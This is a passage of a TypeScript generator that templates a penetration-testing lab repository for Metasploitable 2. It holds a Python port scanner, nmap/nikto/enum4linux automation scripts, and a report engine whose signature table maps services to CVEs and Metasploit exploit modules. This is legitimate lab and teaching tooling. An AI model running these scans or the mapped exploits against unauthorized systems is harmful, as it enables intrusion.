import { LabConfig, RepoFile } from '../types/vapt';

export function buildRepoFiles(cfg: LabConfig): RepoFile[] {
  const safeAuthor = cfg.internName.trim() || 'Cybersecurity Researcher';
  const safeUser = cfg.githubUsername.trim() || 'your-github-username';
  const safeRepo = cfg.repoName.trim() || 'autorecon-vapt-suite';
  const safeTool = cfg.toolName.trim() || 'AutoReconVAPT';
  const safeProgram = cfg.academyOrProgramName.trim() || 'Security Lab Phase 2';
  const safeLab = cfg.labName.trim() || 'Metasploitable 2 Virtual Lab';
  const targetIp = cfg.targetIp.trim() || '192.168.56.101';
  const kaliIp = cfg.kaliIp.trim() || '192.168.56.102';
  const iface = cfg.networkInterface.trim() || 'eth0';
  const year = (cfg.assessmentDate || '2026-11-18').slice(0, 4);

  const netreconV2Py = `#!/usr/bin/env python3
"""
${safeTool} — NetRecon v2 (Option 1 Advanced Multi-Threaded Recon Suite)
-----------------------------------------------------------------------
Program: ${safeProgram}
Lab Target: ${safeLab}
Repository: https://github.com/${safeUser}/${safeRepo}
Author: ${safeAuthor}
License: MIT

Upgrades a basic Phase 1 sequential port scanner into an advanced Python 3
network reconnaissance suite supporting:
  - CIDR subnet discovery & multi-host scanning (e.g. 192.168.56.0/24)
  - Multi-threaded TCP connect + optional top-port UDP probing (--udp)
  - Protocol-aware banner grabbing (HTTP HEAD, FTP, SSH, SMTP EHLO, IRC)
  - TLS/SSL certificate expiry & cipher inspection (--tls)
  - HTTP security header audit on web ports
  - Interactive CLI menu (--interactive) + JSON, Markdown, and CSV export
"""

from __future__ import annotations

import argparse
import concurrent.futures
import csv
import ipaddress
import json
import logging
import socket
import ssl
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple

COMMON_TCP_SERVICES: Dict[int, str] = {
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "domain",
    80: "http",
    110: "pop3",
    111: "rpcbind",
    139: "netbios-ssn",
    143: "imap",
    443: "https",
    445: "microsoft-ds",
    512: "exec",
    513: "login",
    514: "shell",
    1099: "rmiregistry",
    1524: "ingreslock",
    2049: "nfs",
    2121: "ccproxy-ftp",
    3306: "mysql",
    3632: "distccd",
    5432: "postgresql",
    5900: "vnc",
    6667: "irc",
    8009: "ajp13",
    8080: "http-proxy",
    8180: "http-tomcat",
    8443: "https-alt",
}

TOP_UDP_PROBES: Dict[int, bytes] = {
    53: b"\\xaa\\xaa\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07version\\x04bind\\x00\\x00\\x10\\x00\\x03",
    111: b"\\x00\\x00\\x00\\x00",
    123: b"\\x1b" + 47 * b"\\x00",
    161: b"\\x30\\x26\\x02\\x01\\x00\\x04\\x06public\\xa0\\x19\\x02\\x04\\x71\\xb4\\xb5\\x68\\x02\\x01\\x00\\x02\\x01\\x00\\x30\\x0b\\x30\\x09\\x06\\x05\\x2b\\x06\\x01\\x02\\x01\\x05\\x00",
}


@dataclass
class PortFinding:
    host: str
    port: int
    protocol: str
    state: str
    service_guess: str
    banner: str
    latency_ms: float
    tls_info: str = ""
    missing_sec_headers: List[str] = field(default_factory=list)


def setup_logger(verbose: bool) -> logging.Logger:
    logger = logging.getLogger("netrecon_v2")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    if not logger.handlers:
        logger.addHandler(handler)
    return logger


def parse_port_spec(spec: str) -> List[int]:
    """Parse comma-separated ports and ranges (e.g., '21,22,80,1000-1024')."""
    ports = set()
    for token in spec.split(","):
        token = token.strip()
        if not token:
            continue
        if "-" in token:
            parts = token.split("-", 1)
            if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
                raise ValueError(f"Invalid port range: {token}")
            start, end = int(parts[0]), int(parts[1])
            if start < 1 or end > 65535 or start > end:
                raise ValueError(f"Port range out of bounds (1-65535): {token}")
            ports.update(range(start, end + 1))
        else:
            if not token.isdigit():
                raise ValueError(f"Invalid port value: {token}")
            port_num = int(token)
            if port_num < 1 or port_num > 65535:
                raise ValueError(f"Port out of bounds (1-65535): {port_num}")
            ports.add(port_num)
    if not ports:
        raise ValueError("No valid ports provided.")
    return sorted(ports)


def expand_targets(target_spec: str) -> List[str]:
    """Expand a single IPv4, hostname, or CIDR subnet into target IP strings."""
    if "/" in target_spec:
        try:
            network = ipaddress.ip_network(target_spec, strict=False)
            hosts = [str(ip) for ip in network.hosts()]
            if not hosts:
                return [str(network.network_address)]
            if len(hosts) > 1024:
                raise ValueError("CIDR range too large (>1024 hosts). Narrow your subnet.")
            return hosts
        except ValueError as exc:
            raise ValueError(f"Invalid CIDR specification '{target_spec}': {exc}") from exc

    try:
        ipaddress.ip_address(target_spec)
        return [target_spec]
    except ValueError:
        try:
            return [socket.gethostbyname(target_spec)]
        except socket.gaierror as exc:
            raise ValueError(f"Unable to resolve target '{target_spec}': {exc}") from exc


def audit_http_headers(raw_response: str) -> List[str]:
    """Check for missing baseline HTTP security headers in HTTP responses."""
    lowered = raw_response.lower()
    if "http/" not in lowered:
        return []
    required = [
        "x-frame-options",
        "x-content-type-options",
        "content-security-policy",
    ]
    return [hdr for hdr in required if hdr not in lowered]


def inspect_tls_cert(host: str, port: int, timeout: float) -> str:
    """Inspect TLS version and certificate subject/expiry on SSL-enabled ports."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw_sock:
            with ctx.wrap_socket(raw_sock, server_hostname=host) as ssock:
                proto = ssock.version() or "TLS"
                cert = ssock.getpeercert(binary_form=False) or {}
                not_after = cert.get("notAfter", "unknown")
                return f"{proto} (expires: {not_after})"
    except (OSError, ssl.SSLError):
        return ""


def grab_banner(sock: socket.socket, port: int, host: str) -> Tuple[str, List[str]]:
    """Protocol-aware banner grabbing with HTTP security header inspection."""
    try:
        sock.settimeout(1.5)
        if port in (80, 8080, 8180):
            probe = f"HEAD / HTTP/1.0\\r\\nHost: {host}\\r\\n\\r\\n".encode()
            sock.sendall(probe)
        elif port == 25:
            sock.recv(256)
            sock.sendall(b"EHLO recon.local\\r\\n")
        raw = sock.recv(1024)
        text = raw.decode("utf-8", errors="replace")
        missing_headers = audit_http_headers(text)
        cleaned = text.strip().replace("\\r", " ").replace("\\n", " | ")
        return cleaned[:180], missing_headers
    except (socket.timeout, OSError):
        return "", []


def scan_tcp_port(target_ip: str, port: int, timeout: float, check_tls: bool) -> Optional[PortFinding]:
    start = time.perf_counter()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        try:
            if sock.connect_ex((target_ip, port)) == 0:
                elapsed_ms = round((time.perf_counter() - start) * 1000, 2)
                banner, missing_headers = grab_banner(sock, port, target_ip)
                tls_info = ""
                if check_tls and port in (443, 8443, 993, 995):
                    tls_info = inspect_tls_cert(target_ip, port, timeout)
                return PortFinding(
                    host=target_ip,
                    port=port,
                    protocol="tcp",
                    state="open",
                    service_guess=COMMON_TCP_SERVICES.get(port, "unknown"),
                    banner=banner or "No immediate banner",
                    latency_ms=elapsed_ms,
                    tls_info=tls_info,
                    missing_sec_headers=missing_headers,
                )
        except OSError:
            return None
    return None


def scan_udp_top_ports(target_ip: str, timeout: float) -> List[PortFinding]:
    """Probe common UDP services (DNS, RPC, NTP, SNMP) for responsive daemons."""
    udp_findings: List[PortFinding] = []
    for port, payload in TOP_UDP_PROBES.items():
        start = time.perf_counter()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                sock.sendto(payload, (target_ip, port))
                data, _ = sock.recvfrom(512)
                elapsed_ms = round((time.perf_counter() - start) * 1000, 2)
                udp_findings.append(
                    PortFinding(
                        host=target_ip,
                        port=port,
                        protocol="udp",
                        state="open",
                        service_guess={53: "domain", 111: "rpcbind", 123: "ntp", 161: "snmp"}.get(port, "udp"),
                        banner=f"UDP response ({len(data)} bytes)",
                        latency_ms=elapsed_ms,
                    )
                )
            except (socket.timeout, OSError):
                continue
    return udp_findings


def export_results(
    target_input: str,
    hosts_scanned: List[str],
    findings: List[PortFinding],
    duration_sec: float,
    output_dir: Path,
) -> Tuple[Path, Path, Path]:
    output_dir.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    safe_slug = target_input.replace("/", "_").replace(":", "_")
    json_path = output_dir / f"netrecon_{safe_slug}_{timestamp}.json"
    md_path = output_dir / f"netrecon_{safe_slug}_{timestamp}.md"
    csv_path = output_dir / f"netrecon_{safe_slug}_{timestamp}.csv"

    payload = {
        "tool": "${safeTool} — NetRecon v2",
        "program": "${safeProgram}",
        "target_input": target_input,
        "hosts_scanned": hosts_scanned,
        "scanned_at_utc": datetime.now(timezone.utc).isoformat(),
        "duration_seconds": round(duration_sec, 2),
        "open_port_count": len(findings),
        "findings": [asdict(f) for f in findings],
    }
    json_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    lines = [
        f"# ${safeTool} (NetRecon v2) Scan Summary — {target_input}",
        "",
        f"- **Author**: ${safeAuthor}",
        f"- **Target**: \`{target_input}\` ({len(hosts_scanned)} host(s))",
        f"- **Timestamp (UTC)**: {payload['scanned_at_utc']}",
        f"- **Duration**: {payload['duration_seconds']}s",
        f"- **Open Services Found**: {len(findings)}",
        "",
        "| Host | Port | Service | Latency (ms) | Banner | Notes |",
        "| --- | --- | --- | ---: | --- | --- |",
    ]
    for item in findings:
        safe_banner = item.banner.replace("|", "/")
        notes = []
        if item.tls_info:
            notes.append(item.tls_info)
        if item.missing_sec_headers:
            notes.append("Missing headers: " + ", ".join(item.missing_sec_headers))
        lines.append(
            f"| {item.host} | {item.port}/{item.protocol} | {item.service_guess} | {item.latency_ms} | {safe_banner} | {'; '.join(notes) or '-'} |"
        )
    md_path.write_text("\\n".join(lines) + "\\n", encoding="utf-8")

    with csv_path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle)
        writer.writerow(["host", "port", "protocol", "service", "latency_ms", "banner", "tls_info", "missing_headers"])
        for item in findings:
            writer.writerow([
                item.host,
                item.port,
                item.protocol,
                item.service_guess,
                item.latency_ms,
                item.banner,
                item.tls_info,
                ";".join(item.missing_sec_headers),
            ])

    return json_path, md_path, csv_path


def interactive_prompt() -> argparse.Namespace:
    print(f"=== ${safeTool} (NetRecon v2 Interactive Mode) ===")
    target = input("Target IP / Hostname / CIDR [${targetIp}]: ").strip() or "${targetIp}"
    ports = input("Port spec [21,22,23,25,53,80,111,139,445,512-514,1099,1524,2049,3306,3632,5432,5900,6667,8180]: ").strip() or (
        "21,22,23,25,53,80,111,139,445,512-514,1099,1524,2049,3306,3632,5432,5900,6667,8180"
    )
    udp_ans = input("Probe top UDP ports? [y/N]: ").strip().lower() == "y"
    return argparse.Namespace(
        target=target,
        ports=ports,
        threads=60,
        timeout=1.0,
        udp=udp_ans,
        tls=True,
        output="output",
        verbose=False,
        interactive=True,
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description="${safeTool} (NetRecon v2) — Multi-threaded TCP/UDP scanner, banner grabber & header auditor"
    )
    parser.add_argument("-t", "--target", help="Target IPv4, hostname, or CIDR (e.g., ${targetIp} or 192.168.56.0/24)")
    parser.add_argument(
        "-p",
        "--ports",
        default="21,22,23,25,53,80,111,139,445,512-514,1099,1524,2049,3306,3632,5432,5900,6667,8180",
        help="Comma-separated ports or ranges",
    )
    parser.add_argument("--threads", type=int, default=60, help="Worker thread count (default: 60)")
    parser.add_argument("--timeout", type=float, default=1.0, help="Socket timeout in seconds (default: 1.0)")
    parser.add_argument("--udp", action="store_true", help="Include top UDP service probes")
    parser.add_argument("--tls", action="store_true", help="Inspect TLS/SSL certificates on HTTPS ports")
    parser.add_argument("--interactive", action="store_true", help="Launch interactive guided CLI mode")
    parser.add_argument("-o", "--output", default="output", help="Directory for JSON/Markdown/CSV exports")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")

    args = parser.parse_args()
    if args.interactive:
        args = interactive_prompt()
    elif not args.target:
        parser.error("--target is required unless --interactive is specified.")

    logger = setup_logger(args.verbose)
    try:
        hosts = expand_targets(args.target)
        ports = parse_port_spec(args.ports)
    except ValueError as err:
        logger.error("Input validation failed: %s", err)
        return 2

    if args.threads < 1 or args.threads > 250:
        logger.error("Thread count must be between 1 and 250.")
        return 2

    logger.info("Starting ${safeTool} NetRecon v2 against %d host(s) (%d TCP ports)", len(hosts), len(ports))
    t0 = time.perf_counter()
    findings: List[PortFinding] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(scan_tcp_port, host, p, args.timeout, args.tls)
            for host in hosts
            for p in ports
        ]
        for future in concurrent.futures.as_completed(futures):
            try:
                finding = future.result()
                if finding is not None:
                    findings.append(finding)
                    logger.info("OPEN %-15s %-9s %-14s %s", finding.host, f"{finding.port}/tcp", finding.service_guess, finding.banner)
            except Exception as exc:  # noqa: BLE001
                logger.debug("Worker exception: %s", exc)

    if args.udp:
        for host in hosts:
            for udp_item in scan_udp_top_ports(host, args.timeout):
                findings.append(udp_item)
                logger.info("OPEN %-15s %-9s %-14s %s", udp_item.host, f"{udp_item.port}/udp", udp_item.service_guess, udp_item.banner)

    findings.sort(key=lambda item: (item.host, item.port, item.protocol))
    elapsed = time.perf_counter() - t0
    json_f, md_f, csv_f = export_results(args.target, hosts, findings, elapsed, Path(args.output))

    logger.info("Completed in %.2fs. Open services discovered: %d", elapsed, len(findings))
    logger.info("Exports: %s | %s | %s", json_f, md_f, csv_f)
    return 0


if __name__ == "__main__":
    sys.exit(main())
`;

  const runUpgradeSh = `#!/usr/bin/env bash
# ==============================================================================
# ${safeTool} — NetRecon v2 Wrapper (Option 1 Upgraded Tool)
# Program: ${safeProgram} | Lab: ${safeLab}
# Author: ${safeAuthor} | GitHub: https://github.com/${safeUser}/${safeRepo}
# Usage: ./run_recon_upgrade.sh <TARGET_IP_OR_CIDR> [PORT_RANGE]
# ==============================================================================
set -euo pipefail

TARGET="\${1:-${targetIp}}"
PORTS="\${2:-1-1024,1099,1524,2049,3306,3632,5432,5900,6667,8180}"
SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"

if ! command -v python3 >/dev/null 2>&1; then
  echo "[ERROR] python3 is required." >&2
  exit 1
fi

echo "[*] Running ${safeTool} NetRecon v2 against \${TARGET}..."
python3 "\${SCRIPT_DIR}/src/netrecon_v2.py" \\
  --target "\${TARGET}" \\
  --ports "\${PORTS}" \\
  --threads 60 \\
  --timeout 1.0 \\
  --udp \\
  --tls \\
  --output "\${SCRIPT_DIR}/output"
`;

  const autoVaptSh = `#!/usr/bin/env bash
# ==============================================================================
# ${safeTool} — Automated Kali Linux VAPT Pipeline (Option 2 Advanced Tool)
# Program: ${safeProgram}
# Lab: ${safeLab}
# Repository: https://github.com/${safeUser}/${safeRepo}
# Author: ${safeAuthor}
# License: MIT
#
# Profiles:
#   quick    - Top 1000 TCP ports + version/script scan (fast validation)
#   standard - Default full-service + OS + Nikto/Enum4linux + WebAudit
#   deep     - All 65535 TCP ports + top 25 UDP + Nmap vuln NSE + SearchSploit
#
# Usage:
#   sudo ./auto_vapt.sh -t ${targetIp} -i ${iface} --profile standard
# ==============================================================================
set -euo pipefail

RED="\\033[0;31m"
GREEN="\\033[0;32m"
YELLOW="\\033[1;33m"
BLUE="\\033[0;34m"
NC="\\033[0m"

TARGET="${targetIp}"
LHOST="${kaliIp}"
INTERFACE="${iface}"
PROFILE="standard"
OUTPUT_ROOT="./output"

cleanup() {
  echo -e "\\n\${YELLOW}[!] Scan interrupted. Partial logs preserved under \${RUN_DIR:-$OUTPUT_ROOT}.\${NC}"
}
trap cleanup INT TERM

usage() {
  cat <<EOF
${safeTool} — Authorized Lab VAPT Automation

Usage: $0 -t <target_ip> [-l <kali_lhost>] [-i <interface>] [--profile quick|standard|deep]

Options:
  -t, --target      Target lab IPv4 address (default: ${targetIp})
  -l, --lhost       Attacker Kali LHOST for .rc generation (default: ${kaliIp})
  -i, --interface   Kali network interface (default: ${iface})
  -p, --profile     Scan depth: quick | standard | deep (default: standard)
  -o, --output      Output base directory (default: ./output)
  -h, --help        Show this help message
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target) TARGET="$2"; shift 2 ;;
    -l|--lhost) LHOST="$2"; shift 2 ;;
    -i|--interface) INTERFACE="$2"; shift 2 ;;
    -p|--profile) PROFILE="$2"; shift 2 ;;
    -o|--output) OUTPUT_ROOT="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo -e "\${RED}[ERROR]\${NC} Unknown argument: $1"; usage; exit 2 ;;
  esac
done

if [[ ! "$TARGET" =~ ^([0-9]{1,3}\\.){3}[0-9]{1,3}$ ]]; then
  echo -e "\${RED}[ERROR]\${NC} Invalid IPv4 target: $TARGET" >&2
  exit 2
fi

if [[ "$PROFILE" != "quick" && "$PROFILE" != "standard" && "$PROFILE" != "deep" ]]; then
  echo -e "\${RED}[ERROR]\${NC} Invalid profile '$PROFILE'. Use quick, standard, or deep." >&2
  exit 2
fi

for tool in nmap python3; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    echo -e "\${RED}[ERROR]\${NC} Missing required tool: $tool" >&2
    exit 1
  fi
done

SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
RUN_DIR="\${OUTPUT_ROOT}/vapt_\${TARGET}_\${PROFILE}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RUN_DIR"

echo -e "\${BLUE}====================================================================\${NC}"
echo -e "\${BLUE} ${safeTool} | Target: \${TARGET} | Profile: \${PROFILE}\${NC}"
echo -e "\${BLUE} Program: ${safeProgram}\${NC}"
echo -e "\${BLUE}====================================================================\${NC}"
echo -e "\${YELLOW}[!] Authorized lab use only (${safeLab}).\${NC}"

# 1. Host Reachability Check
echo -e "\\n\${GREEN}[1/5]\${NC} Verifying reachability to \${TARGET}..."
if ping -c 2 -W 2 "$TARGET" >/dev/null 2>&1; then
  echo "  [+] ICMP echo reply received."
else
  echo -e "  \${YELLOW}[!] No ICMP reply; continuing with -Pn.\${NC}"
fi

# 2. Profiled Nmap Execution
NMAP_XML="\${RUN_DIR}/nmap_scan.xml"
NMAP_TXT="\${RUN_DIR}/nmap_scan.txt"
echo -e "\\n\${GREEN}[2/5]\${NC} Running Nmap (\${PROFILE} profile)..."

BASE_FLAGS="-sV -sC -Pn -T4 --open"
if [[ $EUID -eq 0 ]]; then
  BASE_FLAGS="-sS -sV -sC -O -Pn -T4 --open"
  if ip link show "$INTERFACE" >/dev/null 2>&1; then
    BASE_FLAGS="$BASE_FLAGS -e $INTERFACE"
  fi
fi

if [[ "$PROFILE" == "deep" ]]; then
  BASE_FLAGS="$BASE_FLAGS -p- --script=vuln"
fi

# shellcheck disable=SC2086
nmap $BASE_FLAGS -oX "$NMAP_XML" -oN "$NMAP_TXT" "$TARGET"

if [[ "$PROFILE" == "deep" && $EUID -eq 0 ]]; then
  echo "  [+] Running top-25 UDP discovery..."
  nmap -sU --top-ports 25 -Pn --open -oN "\${RUN_DIR}/nmap_udp.txt" "$TARGET" || true
fi

# 3. SearchSploit & Secondary Service Enumeration
echo -e "\\n\${GREEN}[3/5]\${NC} Running secondary enumeration & exploit correlation..."
if [[ "$PROFILE" != "quick" ]]; then
  if command -v searchsploit >/dev/null 2>&1; then
    searchsploit --nmap "$NMAP_XML" > "\${RUN_DIR}/searchsploit_matches.txt" 2>&1 || true
  fi
  if grep -qE "80/tcp\\s+open|8180/tcp\\s+open" "$NMAP_TXT" && command -v nikto >/dev/null 2>&1; then
    echo "  [+] Probing HTTP surface with Nikto (60s cap)..."
    timeout 60 nikto -h "http://\${TARGET}" -output "\${RUN_DIR}/nikto_http.txt" || true
  fi
  if grep -qE "445/tcp\\s+open|139/tcp\\s+open" "$NMAP_TXT" && command -v enum4linux >/dev/null 2>&1; then
    echo "  [+] Probing SMB shares/users with Enum4linux (45s cap)..."
    timeout 45 enum4linux -S -U "$TARGET" > "\${RUN_DIR}/enum4linux.txt" 2>&1 || true
  fi
fi

# 4. Python Web Surface & Security Header Audit
echo -e "\\n\${GREEN}[4/5]\${NC} Running Python Web Surface Audit..."
python3 "\${SCRIPT_DIR}/src/web_audit.py" --target "$TARGET" --out "\${RUN_DIR}/web_audit.json" || true

# 5. Python VAPT Analysis Engine (JSON + Markdown + Standalone HTML + MSF .rc)
echo -e "\\n\${GREEN}[5/5]\${NC} Generating JSON, Markdown, HTML, and Metasploit artifacts..."
python3 "\${SCRIPT_DIR}/src/vapt_engine.py" \\
  --xml "$NMAP_XML" \\
  --out "$RUN_DIR" \\
  --author "${safeAuthor}" \\
  --lhost "$LHOST"

echo -e "\\n\${GREEN}[COMPLETE]\${NC} Assessment artifacts ready in: \${RUN_DIR}"
ls -lh "$RUN_DIR"
`;

  const vaptEnginePy = `#!/usr/bin/env python3
"""
${safeTool} — Python VAPT XML Correlation & Multi-Format Report Engine
---------------------------------------------------------------------
Program: ${safeProgram}
Repository: https://github.com/${safeUser}/${safeRepo}
Author: ${safeAuthor}
License: MIT

Parses Nmap XML (ports, service banners, OS fingerprints, and NSE script
output), matches against an extensible CVSS v3.1 signature database, and
writes:
  1. findings.json      — Structured JSON assessment dataset
  2. vapt_report.md     — Executive & technical Markdown report
  3. vapt_report.html   — Standalone print-ready HTML report
  4. msf_lab_verify.rc  — Metasploit check/verification script
"""

from __future__ import annotations

import argparse
import html
import json
import re
import sys
import xml.etree.ElementTree as ET
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional


@dataclass
class OpenService:
    port: int
    protocol: str
    service: str
    product: str
    version: str
    extrainfo: str
    nse_notes: List[str] = field(default_factory=list)

    @property
    def banner_summary(self) -> str:
        parts = [p for p in (self.product, self.version, self.extrainfo) if p]
        return " ".join(parts) if parts else self.service


@dataclass
class MatchedVulnerability:
    port: int
    protocol: str
    service_banner: str
    title: str
    cve: str
    cvss: float
    severity: str
    msf_module: str
    remediation: str
    nse_evidence: str = ""


SIGNATURES = [
    {
        "port": 21,
        "pattern": r"vsftpd\\s*2\\.3\\.4",
        "title": "vsftpd 2.3.4 Backdoor Command Execution",
        "cve": "CVE-2011-2523",
        "cvss": 10.0,
        "severity": "Critical",
        "msf_module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "remediation": "Remove compromised vsftpd 2.3.4, deploy verified upstream packages, and prefer SFTP.",
    },
    {
        "port": 1524,
        "pattern": r"ingreslock|bindshell|root",
        "title": "Unauthenticated Root Bindshell on Port 1524",
        "cve": "CWE-284",
        "cvss": 9.8,
        "severity": "Critical",
        "msf_module": "",
        "remediation": "Terminate the bindshell process and audit /etc/inetd.conf for unauthorized listeners.",
    },
    {
        "port": 6667,
        "pattern": r"UnrealIRCd",
        "title": "UnrealIRCd 3.2.8.1 Trojaned Source Backdoor",
        "cve": "CVE-2010-2075",
        "cvss": 9.8,
        "severity": "Critical",
        "msf_module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
        "remediation": "Remove trojaned UnrealIRCd builds and verify cryptographic checksums before deployment.",
    },
    {
        "port": 139,
        "pattern": r"Samba\\s*3\\.0\\.20",
        "title": "Samba smbd 3.0.20 Username Map Script RCE",
        "cve": "CVE-2007-2447",
        "cvss": 9.3,
        "severity": "Critical",
        "msf_module": "exploit/multi/samba/usermap_script",
        "remediation": "Upgrade Samba (>= 3.0.25) and disable unsafe username map script rules.",
    },
    {
        "port": 445,
        "pattern": r"Samba\\s*3\\.0\\.20",
        "title": "Samba smbd 3.0.20 Username Map Script RCE (SMB)",
        "cve": "CVE-2007-2447",
        "cvss": 9.3,
        "severity": "Critical",
        "msf_module": "exploit/multi/samba/usermap_script",
        "remediation": "Upgrade Samba and firewall TCP/445 from untrusted network zones.",
    },
    {
        "port": 3632,
        "pattern": r"distccd",
        "title": "DistCC Daemon Remote Command Execution",
        "cve": "CVE-2004-2687",
        "cvss": 9.3,
        "severity": "Critical",
        "msf_module": "exploit/unix/misc/distcc_exec",
        "remediation": "Restrict distccd to trusted build subnets via --allow or disable the service.",
    },
    {
        "port": 1099,
        "pattern": r"rmiregistry|java-rmi",
        "title": "Java RMI Registry Remote Code Execution Exposure",
        "cve": "CWE-94",
        "cvss": 9.1,
        "severity": "Critical",
        "msf_module": "exploit/multi/misc/java_rmi_server",
        "remediation": "Disable remote class loading and bind RMI registries to localhost.",
    },
    {
        "port": 513,
        "pattern": r"login|rlogind",
        "title": "Passwordless rlogin Host-Trust Exposure",
        "cve": "CWE-287",
        "cvss": 9.1,
        "severity": "Critical",
        "msf_module": "",
        "remediation": "Disable rlogind and delete /etc/hosts.equiv and ~/.rhosts wildcard trust entries.",
    },
    {
        "port": 512,
        "pattern": r"exec|rexec",
        "title": "Legacy Cleartext rexec Daemon Enabled",
        "cve": "CWE-287",
        "cvss": 8.8,
        "severity": "High",
        "msf_module": "",
        "remediation": "Disable rexecd in /etc/inetd.conf and enforce SSHv2 key authentication.",
    },
    {
        "port": 8180,
        "pattern": r"Tomcat|Coyote",
        "title": "Apache Tomcat Manager Default Credentials & WAR Upload",
        "cve": "CWE-798",
        "cvss": 8.8,
        "severity": "High",
        "msf_module": "exploit/multi/http/tomcat_mgr_upload",
        "remediation": "Rotate manager passwords, IP-restrict /manager/html, and upgrade EOL Tomcat 5.5.",
    },
    {
        "port": 5432,
        "pattern": r"PostgreSQL\\s*8\\.3",
        "title": "PostgreSQL 8.3 EOL & Default Superuser Risk",
        "cve": "CVE-2009-3229",
        "cvss": 8.1,
        "severity": "High",
        "msf_module": "exploit/linux/postgres/postgres_payload",
        "remediation": "Bind PostgreSQL to localhost, enforce strong SCRAM-SHA-256 passwords, and upgrade.",
    },
    {
        "port": 3306,
        "pattern": r"MySQL\\s*5\\.0",
        "title": "MySQL 5.0 EOL & Weak/Empty Root Access Surface",
        "cve": "CWE-521",
        "cvss": 7.8,
        "severity": "High",
        "msf_module": "",
        "remediation": "Bind MySQL to 127.0.0.1, set strong root credentials, and upgrade to a supported release.",
    },
    {
        "port": 23,
        "pattern": r"telnet",
        "title": "Cleartext Telnet Administration Service",
        "cve": "CWE-319",
        "cvss": 7.5,
        "severity": "High",
        "msf_module": "",
        "remediation": "Disable Telnet daemon and migrate remote administration to SSHv2.",
    },
    {
        "port": 5900,
        "pattern": r"VNC",
        "title": "VNC Remote Desktop Weak Password Surface",
        "cve": "CWE-521",
        "cvss": 7.5,
        "severity": "High",
        "msf_module": "",
        "remediation": "Tunnel VNC over SSH, enforce strong authentication, or restrict to management VLANs.",
    },
    {
        "port": 80,
        "pattern": r"Apache.*2\\.2\\.8|PHP/5\\.2",
        "title": "End-of-Life Apache 2.2.8 / PHP 5.2 Web Stack",
        "cve": "CWE-1104",
        "cvss": 7.5,
        "severity": "High",
        "msf_module": "",
        "remediation": "Upgrade Apache & PHP to maintained releases and remove intentionally vulnerable demo apps.",
    },
]


def parse_nmap_xml(xml_path: Path) -> tuple[str, str, List[OpenService]]:
    """Parse Nmap XML and return (target_ip, os_guess, open_services)."""
    if not xml_path.exists():
        raise FileNotFoundError(f"Nmap XML file not found: {xml_path}")

    try:
        tree = ET.parse(xml_path)
    except ET.ParseError as exc:
        raise ValueError(f"Malformed Nmap XML file '{xml_path}': {exc}") from exc

    root = tree.getroot()
    host = root.find("host")
    if host is None:
        raise ValueError("No <host> element found in Nmap XML.")

    addr_elem = host.find("address[@addrtype='ipv4']")
    target_ip = addr_elem.get("addr", "unknown") if addr_elem is not None else "unknown"

    os_match = host.find("os/osmatch")
    os_guess = os_match.get("name", "Not identified") if os_match is not None else "Not identified"

    services: List[OpenService] = []
    for port_elem in host.findall("ports/port"):
        state_elem = port_elem.find("state")
        if state_elem is None or state_elem.get("state") != "open":
            continue
        svc_elem = port_elem.find("service")
        nse_notes: List[str] = []
        for script_elem in port_elem.findall("script"):
            sid = script_elem.get("id", "")
            sout = (script_elem.get("output", "") or "").strip().replace("\\n", " ")
            if sid and sout:
                nse_notes.append(f"{sid}: {sout[:160]}")

        services.append(
            OpenService(
                port=int(port_elem.get("portid", "0")),
                protocol=port_elem.get("protocol", "tcp"),
                service=svc_elem.get("name", "unknown") if svc_elem is not None else "unknown",
                product=svc_elem.get("product", "") if svc_elem is not None else "",
                version=svc_elem.get("version", "") if svc_elem is not None else "",
                extrainfo=svc_elem.get("extrainfo", "") if svc_elem is not None else "",
                nse_notes=nse_notes,
            )
        )
    services.sort(key=lambda s: s.port)
    return target_ip, os_guess, services


def match_vulnerabilities(services: List[OpenService]) -> List[MatchedVulnerability]:
    """Match open services and NSE outputs against CVSS-scored signatures."""
    matched: List[MatchedVulnerability] = []
    for svc in services:
        searchable = f"{svc.service} {svc.product} {svc.version} {svc.extrainfo}".strip()
        for sig in SIGNATURES:
            if svc.port == sig["port"] and re.search(sig["pattern"], searchable, re.IGNORECASE):
                matched.append(
                    MatchedVulnerability(
                        port=svc.port,
                        protocol=svc.protocol,
                        service_banner=svc.banner_summary,
                        title=sig["title"],
                        cve=sig["cve"],
                        cvss=sig["cvss"],
                        severity=sig["severity"],
                        msf_module=sig["msf_module"],
                        remediation=sig["remediation"],
                        nse_evidence="; ".join(svc.nse_notes),
                    )
                )
    matched.sort(key=lambda v: v.cvss, reverse=True)
    return matched


def build_html_report(
    target_ip: str,
    os_guess: str,
    services: List[OpenService],
    vulns: List[MatchedVulnerability],
    author: str,
    generated_at: str,
) -> str:
    svc_rows = "".join(
